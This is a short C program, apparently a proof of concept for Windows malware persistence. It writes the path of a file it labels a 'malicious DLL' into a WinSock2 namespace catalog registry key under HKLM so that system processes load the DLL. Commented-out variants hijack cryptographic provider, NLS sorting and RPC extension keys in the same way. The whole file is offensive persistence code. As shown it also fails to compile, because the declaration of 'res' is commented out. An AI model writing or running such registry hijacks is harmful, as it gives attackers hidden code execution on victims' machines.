/*
*/
#include <windows.h>
#include <string.h>

int main(int argc, char* argv[]) {
  HKEY hkey = NULL;
  // malicious DLL
//   const char* dll = "C:\\windows\\system32\\hack.dll";
  const char* dll = "Z:\\hack.dll";
//   const char* dll = "combase.dll";

  // RSA
//   LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)"SOFTWARE\\Microsoft\\Cryptography\\Defaults\\Provider\\Microsoft Strong Cryptographic Provider", 0 , KEY_WRITE, &hkey);
//   if (res == ERROR_SUCCESS) {
//     // create new registry keys
//     RegSetValueEx(hkey, (LPCSTR)"Image Path", 0, REG_SZ, (unsigned char*)dll, strlen(dll));
//     RegCloseKey(hkey);
//   }

//   res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)"SOFTWARE\\Microsoft\\Cryptography\\Defaults\\Provider\\Microsoft Enhanced RSA and AES Cryptographic Provider", 0 , KEY_WRITE, &hkey);
//   if (res == ERROR_SUCCESS) {
//     // create new registry keys
//     RegSetValueEx(hkey, (LPCSTR)"Image Path", 0, REG_SZ, (unsigned char*)dll, strlen(dll));
//     RegCloseKey(hkey);
//   }

//   res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)"System\\CurrentControlSet\\Control\\Nls\\Sorting\\Versions", 0 , KEY_WRITE, &hkey);
//   if (res == ERROR_SUCCESS) {
//     // create new registry keys
//     RegSetValueEx(hkey, (LPCSTR)"000604xx", 0, REG_SZ, (unsigned char*)dll, strlen(dll));
//     RegCloseKey(hkey);
//   }

//   LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)"SOFTWARE\\Microsoft\\Rpc\\Extensions", 0 , KEY_WRITE, &hkey);
//   if (res == ERROR_SUCCESS) {
//     // create new registry keys
//     RegSetValueEx(hkey, (LPCSTR)"NdrOleExtDll", 0, REG_SZ, (unsigned char*)dll, strlen(dll));
//     RegCloseKey(hkey);
//   }

  res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)"System\\CurrentControlSet\\Services\\WinSock2\\Parameters\\NameSpace_Catalog5\\Catalog_Entries64\\000000000007", 0 , KEY_WRITE, &hkey);
  if (res == ERROR_SUCCESS) {
    // create new registry keys
    RegSetValueEx(hkey, (LPCSTR)"LibraryPath", 0, REG_SZ, (unsigned char*)dll, strlen(dll));
    RegCloseKey(hkey);
  }
  return 0;
}